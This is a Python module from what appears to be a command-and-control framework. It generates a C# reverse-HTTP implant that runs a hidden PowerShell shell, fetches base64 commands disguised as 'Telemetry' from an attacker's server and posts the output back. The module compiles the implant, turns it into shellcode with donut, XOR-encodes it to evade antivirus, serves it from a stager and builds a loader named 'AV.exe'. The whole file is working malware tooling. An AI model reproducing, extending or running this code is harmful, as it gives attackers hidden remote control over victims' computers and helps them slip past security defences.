import base64
import os
import tempfile
import subprocess
import shutil
from pathlib import Path
from core.payload_generator.common import payload_utils as payutils
from core.payload_generator.common.payload_utils import XorEncode
from core.payload_generator.windows.http.exe import build_make
from core import stager_server as stage
from colorama import init, Fore, Style

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"


def make_raw(ip, port):
	payload = f"""

using System;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.Text;
using System.Threading;

class Program
{{
	static void Main(string[] args)
	{{
		// 1) Generate a persistent SID
		string sid = GenerateSid();

		// 2) C2 endpoint
		string url = "http://{ip}:{port}/";

		// 3) Start a hidden, persistent PowerShell process
		var psi = new ProcessStartInfo {{
			FileName               = "powershell.exe",
			Arguments              = "-NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass",
			RedirectStandardInput  = true,
			RedirectStandardOutput = true,
			RedirectStandardError  = true,
			UseShellExecute        = false,
			CreateNoWindow         = true,
		}};
		var ps = Process.Start(psi);
		if (ps == null) {{
			return;
		}}

		var outMem = new MemoryStream();
		var errMem = new MemoryStream();
		Thread tOut = new Thread(() => CopyStream(ps.StandardOutput.BaseStream, outMem)) {{ IsBackground = true }};
		Thread tErr = new Thread(() => CopyStream(ps.StandardError .BaseStream, errMem)) {{ IsBackground = true }};
		tOut.Start();
		tErr.Start();

		var psIn = ps.StandardInput;

		// 4) Main loop
		while (true)
		{{

			try
			{{
				var getReq = (HttpWebRequest)WebRequest.Create(url);
				getReq.Method    = "GET";
				getReq.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
				getReq.Headers.Add("X-Session-ID", sid);

				string body;
				using (var getResp = (HttpWebResponse)getReq.GetResponse())
				using (var sr      = new StreamReader(getResp.GetResponseStream(), Encoding.UTF8))
					body = sr.ReadToEnd();

				var cmdB64 = ParseTelemetry(body);
				if (!string.IsNullOrEmpty(cmdB64))
				{{
					var cmdBytes = Convert.FromBase64String(cmdB64);
					var cmdText  = Encoding.UTF8.GetString(cmdBytes);

					psIn.WriteLine(cmdText);
					psIn.Flush();
				}}
				else
				{{
				}}

				Thread.Sleep(2000);

				string outRaw;
				lock (outMem)
				{{
					outMem.Position = 0;
					errMem.Position = 0;
					var stdout = new StreamReader(outMem, Encoding.UTF8).ReadToEnd();
					var stderr = new StreamReader(errMem, Encoding.UTF8).ReadToEnd();
					outRaw = stdout + stderr;
					outMem.SetLength(0);
					errMem.SetLength(0);
				}}

				var outBytes = Encoding.UTF8.GetBytes(outRaw);
				var outB64   = Convert.ToBase64String(outBytes);
				var json     = "{{\\"output\\":\\"" + outB64 + "\\"}}";

				var postReq = (HttpWebRequest)WebRequest.Create(url);
				postReq.Method      = "POST";
				postReq.UserAgent   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
				postReq.ContentType = "application/json; charset=UTF-8";
				postReq.Headers.Add("X-Session-ID", sid);

				var postData = Encoding.UTF8.GetBytes(json);
				postReq.ContentLength = postData.Length;
				using (var reqStream = postReq.GetRequestStream())
				{{
					reqStream.Write(postData, 0, postData.Length);
				}}

				using (var postResp = (HttpWebResponse)postReq.GetResponse())
				{{
				}}
			}}
			catch (Exception ex)
			{{
			}}

			Thread.Sleep(5000);
		}}
	}}

	static void CopyStream(Stream input, Stream output)
	{{
		var buffer = new byte[4096];
		int read;
		try
		{{
			while ((read = input.Read(buffer, 0, buffer.Length)) > 0)
			{{
				output.Write(buffer, 0, read);
				output.Flush();
			}}
		}}
		catch (Exception ex)
		{{
		}}
	}}

	static string GenerateSid()
	{{
		const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
		int seed = (int)DateTime.Now.Ticks ^ Process.GetCurrentProcess().Id;
		var rnd = new Random(seed);
		var sb  = new StringBuilder(3 * 5 + 2);
		for (int seg = 0; seg < 3; seg++)
		{{
			for (int i = 0; i < 5; i++)
				sb.Append(chars[rnd.Next(chars.Length)]);
			if (seg < 2) sb.Append('-');
		}}
		return sb.ToString();
	}}

	static string ParseTelemetry(string resp)
	{{
		var m = Regex.Match(resp, "\\"Telemetry\\"\\\\s*:\\\\s*\\"(?<b64>[A-Za-z0-9+/=]+)\\"");
		if (m.Success)
		{{
			return m.Groups["b64"].Value;
		}}
		m = Regex.Match(resp, "\\"cmd\\"\\\\s*:\\\\s*\\"(?<b64>[A-Za-z0-9+/=]+)\\"");
		if (m.Success)
		{{
			return m.Groups["b64"].Value;
		}}
		return null;
	}}
}}
"""
	
	return payload


def generate_exe_reverse_http(ip, port, obs, beacon_interval, headers, useragent, stager_ip="0.0.0.0", stager_port=9999,
	accept=None, byte_range=None, jitter=None, profile=None):
	raw = make_raw(ip, port)

	# 2) write to temp .c file
	fd, c_path = tempfile.mkstemp(suffix=".cs", text=True)
	try:
		with os.fdopen(fd, "w") as f:
			f.write(raw)
		
		# 3) compile with Mingw‑w64 as x86_64 Windows exe
		exe_path = c_path[:-2] + ".exe"
		mcs = "mcs"
		cmd = [
			mcs,
			"-target:exe",
			f"-out:{exe_path}",
			c_path
		]
		#print(f"[+] Compiling payload: {' '.join(cmd)}")
		subprocess.run(cmd)

		# 4) run donut to produce shellcode blob (format=raw)
		sc_path = c_path[:-2] + ".bin"
		donut = shutil.which("donut")
		# -f 1 => raw shellcode, -a 2 => amd64, -o => output
		donut_cmd = [donut, "-b", "1", "-f", "3", "-a", "2", "-o", sc_path, "-i", exe_path]
		#print(f"[+] Generating shellcode: {' '.join(donut_cmd)}")
		subprocess.run(donut_cmd) #stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL

		# 5) read the shellcode blob into memory
		try:
			with open(sc_path, "rb") as f:
				shellcode = f.read()

		except Exception as e:
			print(f"ERROR: {e}")

		shellcode = shellcode.replace(b"unsigned char buf[] =", b"")

		with open(sc_path, "wb") as f:
			f.write(shellcode)
		
		with open(sc_path, "rb") as f:
			donut_file = f.read()

		"""with open("/home/kali/tools/C2/Gunner/gunnerc2/implantdev/learning/c-reverse-shell/rveshell/new/donut_file.c", "wb") as f:
			f.write(donut_file)"""

		# 6) XOR‑encode it using our XorEncode helper
		encoder = XorEncode()
		#encoder.shellcode = bytearray(shellcode)
		length = len(shellcode)
		#print("AFTER length")
		print("MAKING TEMP FILES FOR XOR ENCODE")

		fd, output_trash = tempfile.mkstemp(suffix=".bin", text=True)
		fd, xor_main_output = tempfile.mkstemp(suffix=".c", text=True)
		payload = encoder.main(sc_path, output_trash, "deadbeefcafebabe", xor_main_output)
		print(f"BUILT PAYLOAD OF TYPE {type(payload)}")
		out = Path.cwd() / "AV.exe"
		print("STARTING STAGER SERVER")
		print(f"IP: {stager_ip}, PORT: {stager_port}")
		print(f"PORT: {type(stager_port)}, PAYLOAD: {type(payload)}, IP, {type(stager_ip)}")
		stage.start_stager_server(stager_port, payload, format="bin", ip=stager_ip)
		print(brightgreen + f"[+] Serving shellcode via stager server {stager_ip}:{stager_port}")
		print("RUNNING BUILD")
		build_status = build_make.build(out, payload, stager_ip, stager_port)
		if build_status:
			return True

	finally:
		# clean up temp files
		for p in (c_path, exe_path, sc_path, output_trash, xor_main_output):
			try:
				os.remove(p)

			except OSError:
				pass